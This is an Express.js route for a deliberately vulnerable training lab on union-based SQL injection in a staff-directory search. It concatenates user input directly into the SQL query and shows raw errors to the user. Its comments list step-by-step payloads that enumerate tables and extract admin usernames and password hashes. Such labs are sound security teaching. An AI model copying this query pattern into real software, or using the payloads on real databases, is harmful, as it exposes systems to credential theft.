const express = require('express');
const router = express.Router();

// Lab 05: Union-Based SQL Injection - Staff Directory Search
// INTENTIONALLY VULNERABLE - DO NOT USE IN PRODUCTION

router.get('/', async (req, res) => {
  const pool = req.app.locals.pool;
  const search = req.query.q || '';

  let staff = [];
  let error = null;

  if (search) {
    try {
      // VULNERABLE: Direct string concatenation - Union-Based SQL Injection possible
      // Attack steps:
      // 1. ' ORDER BY 4-- (find columns)
      // 2. ' UNION SELECT 1,2,3,4-- (find display columns)
      // 3. ' UNION SELECT 1,version(),3,4-- (DB version)
      // 4. ' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=current_schema()-- (list tables)
      // 5. ' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='admin_credentials'-- (list columns)
      // 6. ' UNION SELECT 1,username,password_hash,role FROM admin_credentials-- (extract creds)

      const query = `SELECT id, name, department, position FROM staff WHERE name LIKE '%${search}%' OR department LIKE '%${search}%'`;

      console.log('[Lab05] Executing query:', query);

      const result = await pool.query(query);
      staff = result.rows;

    } catch (err) {
      console.error('[Lab05] SQL Error:', err.message);
      // Show error for educational purposes (error-based SQLi detection)
      error = err.message;
    }
  }

  res.render('labs/lab05', {
    title: 'Staff Directory',
    search: search,
    staff: staff,
    error: error
  });
});

module.exports = router;
